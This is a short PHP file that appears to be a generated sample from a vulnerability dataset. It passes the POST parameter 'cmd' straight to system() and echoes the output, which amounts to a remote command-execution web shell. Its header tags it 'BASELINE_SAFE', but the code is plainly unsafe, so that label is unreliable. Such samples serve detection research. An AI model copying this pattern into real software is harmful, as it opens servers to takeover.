<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY_ISSET; SKELETON=S3; KEY=cmd; SINK=B1; VAR=v0089 */
function SINK_B1($command){
    system($command);
}
$p = $_POST;
$inp = isset($p["cmd"]) ? (string)$p["cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B1($x);
};
$out = $f($inp);
echo (string)($out);
?>
